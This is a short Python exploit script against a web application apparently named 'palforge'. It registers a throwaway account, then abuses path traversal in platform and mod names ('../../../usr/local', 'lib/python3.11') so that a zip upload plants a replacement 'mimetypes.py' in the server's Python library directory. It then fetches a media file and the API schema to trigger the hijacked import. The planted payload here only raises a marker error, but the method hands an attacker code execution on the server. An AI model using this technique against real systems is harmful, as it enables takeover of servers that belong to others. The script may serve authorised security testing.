import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

tok,u=fresh()
# plant broken mimetypes.py in /usr/local/lib/python3.11
mal = b'raise RuntimeError("MIMETYPES_HIJACKED")\n'
pid = pf.create_platform(tok, "lib/python3.11", name="z")
mid = pf.create_mod(tok, "../../../usr/local", title="z")
bid = pf.create_build(tok, mid, pid)
r = pf.upload_zip(tok, mid, bid, {"mimetypes.py": mal})
print("plant broken mimetypes ->", r.status_code, r.text[:80])
# serve a media file to trigger mimetypes
time.sleep(1)
c = requests.get(f"{BASE}/media/builds/2.4.1/win1584/real.txt", timeout=10)
print("serve real.txt ->", c.status_code, repr(c.content[:60]))
# also trigger schema (drf-spectacular may import things)
c2 = requests.get(f"{BASE}/api/schema/", timeout=10)
print("schema ->", c2.status_code)
